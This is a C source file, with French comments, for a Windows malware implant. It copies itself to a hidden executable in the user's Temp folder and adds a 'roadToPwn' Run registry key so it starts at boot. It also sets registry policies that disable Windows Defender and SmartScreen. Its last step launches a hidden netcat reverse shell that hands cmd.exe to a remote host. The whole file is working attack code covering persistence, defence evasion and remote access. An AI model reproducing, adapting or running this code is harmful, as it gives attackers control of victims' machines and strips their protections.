#include <Windows.h>
#include <winbase.h>
#include <Lmcons.h>
#include <wchar.h>
#include <stdio.h>
#include <winreg.h>
#include <unistd.h>

#define BUFSIZE MAX_PATH
#define KEY_WOW64_64KEY 0x0100


//Username
char * getUsername(char *reUsername) {
    
    char buf_username[BUFSIZE];
    wchar_t username[UNLEN+1];
    DWORD len = sizeof(username) / sizeof(wchar_t);
    int r = GetUserNameW(username, &len);
    if (r == 0) {
        wprintf(L"Failed to get username %ld", GetLastError());
        exit(1);
    }
    wcstombs(buf_username, username, sizeof(buf_username));
    sprintf(reUsername, buf_username);
    return &(reUsername[0]);
}

int changePath(){
    char getUser[BUFSIZE];
    char *username=getUser;
    getUsername(username);

    char newPath[BUFSIZE] = "C:\\Users\\";
    strcat(newPath, username);
    char tempPath[BUFSIZE] = "\\AppData\\Local\\Temp\\.jsasijzk.exe";
    strcat(newPath, tempPath);

    rename("pwnd.exe", newPath);
}

//Nouvelle localisation
char * reloc(char *newLocation) {
    char testUser[BUFSIZE];
    char *username=testUser;
    getUsername(username);
    if (username != NULL){
        char newPath[BUFSIZE] = "C:\\Users\\";
        strcat(newPath, username);
        char tempPath[BUFSIZE] = "\\AppData\\Local\\Temp\\.jsasijzk.exe";
        strcat(newPath, tempPath);
        sprintf(newLocation, newPath);
        return &(newLocation[0]);
    } else {
        exit(1);
    }
}

//lance le programme au boot
int startOnBoot(){
    HKEY key;
    DWORD kSize;

    char tempNewLocation[BUFSIZE];
    char *newLocation=tempNewLocation;
    reloc(newLocation);

    if (newLocation != NULL) {

                     //HKEY_LOCAL_MACHINE pour tout le système
        RegCreateKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, 0, KEY_ALL_ACCESS, NULL, &key, &kSize);
        RegSetValueEx(key, "roadToPwn", 0, REG_SZ, (LPBYTE)newLocation, strlen(newLocation)+1);
        RegCloseKey(key);
    }
}


//Desactive windows defender section : "Protection contre les virus et les menaces"
int disableWinDefender() {
    HKEY key;   
    int data = 1;

    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_ALL_ACCESS , &key);
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &key, NULL);
    RegSetValueEx(key, "DisableAntiSpyware", 0, REG_DWORD, (LPBYTE)&data, sizeof(DWORD));
    RegCloseKey(key);
}


//Desactive windows defender section : "Controles des applications et du navigateur"
int disableSmartScreen() {
    HKEY key;   
    int data = 0;

    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, KEY_ALL_ACCESS , &key);
    RegCreateKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &key, NULL);
    RegSetValueEx(key, "EnableSmartScreen", 0, REG_DWORD, (LPBYTE)&data, sizeof(DWORD));
    RegCloseKey(key);
}

//check register key startboot
char * checkStartBoot(char *valBool){
    HKEY key;
    
    DWORD dataType;
    DWORD dataValue[BUFSIZE];
    DWORD kSize = sizeof(dataValue);

    RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &key);
    if (RegQueryValueEx(key, "roadToPwn", 0, &dataType, (LPBYTE)&dataValue, &kSize) == ERROR_SUCCESS){
        sprintf(valBool, "true");
        return &(valBool[0]); 
        
    } else {
        sprintf(valBool, "false");
        return &(valBool[0]); 

    }
    
    RegCloseKey(key);
    
}

//check register key winDefender
char * checkWinDefender(char * valBool){
    HKEY key;
    
    DWORD dataType;
    DWORD dataValue[BUFSIZE];
    DWORD kSize = sizeof(dataValue);

    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_QUERY_VALUE, &key);
    if (RegQueryValueEx(key, "DisableAntiSpyware", 0, &dataType, (LPBYTE)&dataValue, &kSize) == ERROR_SUCCESS){
        sprintf(valBool, "true");
        return &(valBool[0]); 

    } else {
        sprintf(valBool, "false");
        return &(valBool[0]); 

    }
    
    RegCloseKey(key);
}

//check register key smartScreen
char * checkSmartScreen(char * valBool){
    HKEY key;
    
    DWORD dataType;
    DWORD dataValue[BUFSIZE];
    DWORD kSize = sizeof(dataValue);

    RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows\\System", 0, KEY_QUERY_VALUE, &key);
    if (RegQueryValueEx(key, "EnableSmartScreen", 0, &dataType, (LPBYTE)&dataValue, &kSize) == ERROR_SUCCESS){
        sprintf(valBool, "true");   
        return &(valBool[0]); 

    } else {
        sprintf(valBool, "false");
        return &(valBool[0]); 

    }
    
    RegCloseKey(key);
}

int reverse(){
   WinExec("nc64.exe -e cmd.exe 10.10.10.254 7788", SW_HIDE);
   //("nc64.exe -e cmd.exe 10.10.10.254 7788");
}

int main() {
    changePath();
    int count = 0;
    char valueForStart[BUFSIZE];    
    char *valReturn = valueForStart;
    checkStartBoot(valReturn);
    if (valReturn != NULL){
    //    printf("first return : %s\n", valReturn);
        if (strcmp(valReturn, "false") == 0) startOnBoot();
        else count++;
    }

    char valueForSecond[BUFSIZE];
    char *valReturnSec = valueForSecond;
    checkWinDefender(valReturnSec);
    if (valReturnSec != NULL){
     //   printf("second return : %s\n", valReturnSec);
        if (strcmp(valReturnSec, "false") == 0) disableWinDefender();
        else count++;
    }

    char valueForThird[BUFSIZE];
    char *valReturnTh = valueForThird;
    checkSmartScreen(valReturnTh);
    if (valReturnTh != NULL){
     //   printf("third return : %s\n", valReturnTh);
        if (strcmp(valReturnTh, "false") == 0) disableSmartScreen();
        else count++;
    }
 //   printf("count value : %d\n", count);
    reverse();
    return 0;
}